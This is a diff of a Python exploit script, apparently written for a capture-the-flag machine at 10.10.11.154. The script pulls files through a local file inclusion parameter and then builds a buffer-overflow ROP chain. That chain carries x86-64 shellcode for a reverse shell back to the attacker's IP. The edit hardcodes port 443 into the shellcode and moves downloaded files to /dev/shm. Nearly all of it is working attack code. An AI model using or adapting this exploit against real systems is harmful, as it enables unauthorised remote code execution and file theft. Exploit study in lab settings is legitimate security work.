@@ -12,12 +12,11 @@ def kill(sig, frame):
 
 signal.signal(signal.SIGINT, kill)
 
-inip = input("[\033[1;34m*\033[1;37m] Introduce tu ip (tun0): ")
-inport = ("443")
+inip = input("\n[\033[1;34m*\033[1;37m] Introduce tu ip (tun0): ")
 
 def file(path):
     request = requests.get(f"http://10.10.11.154/index.php?page={path}", allow_redirects=False)
-    rpath = f"/tmp/{path.split('/')[-1]}"
+    rpath = f"/dev/shm/{path.split('/')[-1]}"
     with open(rpath,"wb") as f:
         f.write(request.content)
     return rpath
@@ -39,11 +38,9 @@ def adrs(pid):
 
 def bof():
     ip = socket.inet_aton(inip)
-    port =  port=struct.pack(">H",int(inport))
-
     payload =  b""
     payload += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
-    payload += b"\x97\x48\xb9\x02\x00"   + port  +  ip +   b"\x51\x48"
+    payload += b"\x97\x48\xb9\x02\x00\x01\xbb"  +   ip  +  b"\x51\x48"
     payload += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
     payload += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
     payload += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
@@ -71,7 +68,6 @@ def bof():
     rsp = rop.jmp_rsp[0]
 
     exploit = b'A' * offset
-
     exploit += p64(rdi) + p64(sbase)
     exploit += p64(rsi) + p64(ssize)
     exploit += p64(rdx) + p64(7)
